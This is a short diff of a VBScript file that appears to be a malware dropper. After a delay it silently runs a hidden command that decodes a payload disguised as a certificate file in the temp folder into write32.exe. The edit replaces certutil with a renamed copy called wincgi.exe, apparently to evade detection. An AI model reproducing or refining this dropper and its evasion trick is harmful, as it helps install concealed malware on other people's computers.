@@ -19,7 +19,7 @@ End Function
 WScript.Sleep(5000)
 
 Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c powershell certutil -decode %temp%\write32\write32.crt %temp%\write32\write32.exe; ", 0, True
+objShell.Run "cmd /c powershell %temp%\write32\wincgi.exe -decode %temp%\write32\write32.crt %temp%\write32\write32.exe; ", 0, True
 
 WScript.Sleep(10000)
 
